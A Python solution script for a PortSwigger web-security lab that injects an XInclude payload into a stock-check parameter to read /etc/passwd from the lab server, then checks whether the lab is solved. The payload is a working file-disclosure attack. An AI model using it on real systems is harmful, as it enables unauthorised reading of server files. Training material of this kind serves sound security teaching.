#!/usr/bin/env python


'''This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.
Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.
To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file.

Lab link: https://portswigger.net/web-security/xxe/lab-xinclude-attack
'''

import requests


lab_id = '0aaa0085048dd80c860c18ad00af00aa' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/product/stock" 

payload = '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>''' 

data = { "productId" : payload, "storeId" : 1 } # XXE added to the post parameters

r = requests.post(uri, data=data)
print(r.text)
r2 = requests.get(f"https://{lab_id}.web-security-academy.net")
if "Congratulations" in r2.text:
    print("solved")
else:
    print("nope")
    print(r.text)